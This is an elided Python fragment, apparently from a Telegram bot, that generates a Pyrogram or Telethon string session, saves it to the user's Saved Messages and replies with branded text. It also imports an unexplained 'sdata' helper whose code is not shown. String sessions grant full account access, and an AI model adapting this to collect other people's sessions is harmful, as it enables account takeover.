...
from FallenRobot.helper_extra.sdata import sdata
...
async def generate_session(bot, msg, telethon=False):
    ...
    text = "**{} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{}` \n\n ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ @DevilsHeavenMF".format("TELETHON" if telethon else "PYROGRAM", string_session)
    await client.send_message("me", text)
    await client.disconnect()
    await phone_code_msg.reply("sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ {} sᴛʀɪɴɢ sᴇssɪᴏɴ. \n\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ! \n\nʙʏ​ [𝝙𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦](t.me/DevilsHeavenMF)".format("telethon" if telethon else "pyrogram"))
